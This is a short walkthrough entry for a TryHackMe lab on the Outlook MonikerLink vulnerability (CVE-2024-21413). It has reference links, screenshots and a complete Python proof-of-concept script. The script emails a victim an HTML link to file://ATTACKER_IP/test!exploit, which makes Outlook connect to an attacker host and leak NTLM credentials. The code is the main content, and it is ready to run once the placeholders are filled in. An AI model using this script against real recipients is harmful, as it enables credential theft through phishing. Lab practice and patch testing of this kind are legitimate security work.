### 23-Feb-24-Fri

[TryHackMe | Moniker Link (CVE-2024-21413)](https://tryhackme.com/room/monikerlink)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/549ec929-5b2e-49d0-bf0f-f5a88119c881)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/b5b6774b-41fb-4975-a59f-e32a4514e522)

https://www.cve.org/CVERecord?id=CVE-2024-21413

https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/

https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413

https://learn.microsoft.com/en-us/windows/win32/com/url-monikers

https://github.com/CMNatic/CVE-2024-21413 *POC*

```
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_IP/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSVERIP', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\nEmail delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/b6a7df58-327f-4ed3-a156-a3c066c1eeff)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/957bf358-045c-4eb0-b6bb-6452eee8bcea)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/f4cff1a4-eda5-4ef4-9860-6ba0112cbe0b)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/14fdc5d5-9209-4185-8628-822f59be3346)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/d713464e-c561-4900-9588-3194a4930808)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/2e5d5296-fdfb-4887-9a5a-e5574f08a6d2)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/3ce1fcb7-892e-4a62-a1c0-e0f242a4d5cf)
